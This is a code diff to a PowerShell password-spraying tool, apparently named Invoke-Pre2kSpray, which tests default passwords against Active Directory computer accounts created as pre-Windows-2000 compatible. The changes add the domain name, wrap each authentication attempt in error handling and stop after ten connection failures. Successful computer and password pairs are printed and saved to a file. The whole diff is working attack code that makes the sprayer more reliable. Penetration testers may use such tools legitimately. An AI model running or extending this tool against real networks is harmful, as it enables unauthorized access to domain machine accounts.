@@ -61,6 +61,7 @@ function Invoke-Pre2kSpray
             # Trying to use the current user's domain
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+            $Domain = $DomainObject.Name
         }
     }
     catch
@@ -222,6 +223,7 @@ function Invoke-SpraySinglePassword
     $count = $UserListArray.count
     Write-Host "[*] Starting pre2k spray against $count computers. Current time is $($time.ToShortTimeString())"
     $curr_user = 0
+    $conn_errors = 0
     if ($OutFile -ne "")
     {
         Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
@@ -240,21 +242,32 @@ function Invoke-SpraySinglePassword
             $Password = $Password.Substring(0,14)
         }
 
-        # Try authenticating
-        $Context = "Domain"
-        $Authtype = "Sealing"
-        $conn = new-object system.directoryservices.accountmanagement.principalcontext($Context, $DomainFQDN, $Authtype)
-
-        # Authenticate using the provided credentials
-        if ($conn.ValidateCredentials($Computer, $Password)) {
-            if ($OutFile -ne "")
-            {
-                Add-Content $OutFile $Computer`:$Password
+        try {
+            $Context = "Domain"
+            $Authtype = "Sealing"
+            $conn = new-object system.directoryservices.accountmanagement.principalcontext($Context, $DomainFQDN, $Authtype)
+            
+            # Authenticate using the provided credentials
+            if ($conn.ValidateCredentials($Computer, $Password)) {
+                if ($OutFile -ne "")
+                {
+                    Add-Content $OutFile $Computer`:$Password
+                }
+                Write-Host -ForegroundColor Green "[*] SUCCESS! Computer:$Computer Password:$Password"
             }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! Computer:$Computer Password:$Password"
-        } 
+        } catch {
+            $conn_errors += 1
+        }
         
         $curr_user += 1
+        
+        if ($conn_errors -eq 10 -and $curr_user -eq 10) 
+        {
+            echo "[!] 10 out of 10 tries could not connect to" $DomainFQDN
+            echo "[!] Exiting"
+            return
+        }
+
         Write-Host -nonewline "$curr_user of $count computers tested`r"
     }
 
